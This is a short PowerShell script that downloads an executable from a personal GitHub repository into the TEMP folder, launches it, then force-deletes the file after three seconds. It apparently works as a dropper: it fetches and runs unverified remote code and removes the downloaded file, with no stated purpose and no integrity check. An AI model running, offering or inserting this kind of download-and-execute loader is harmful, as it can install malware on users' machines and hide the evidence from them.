# ===== CONFIG =====
$exeUrl = "https://raw.githubusercontent.com/lubyralph6-maker/godpum.ps1/main/main2.exe"

# ===== TEMP PATH =====
$tempExe = Join-Path $env:TEMP "main2.exe"

# ===== DOWNLOAD =====
Invoke-WebRequest -Uri $exeUrl -OutFile $tempExe

# ===== RUN =====
Start-Process $tempExe

# ===== WAIT =====
Start-Sleep -Seconds 3

# ===== DELETE TEMP FILE =====
Remove-Item $tempExe -Force
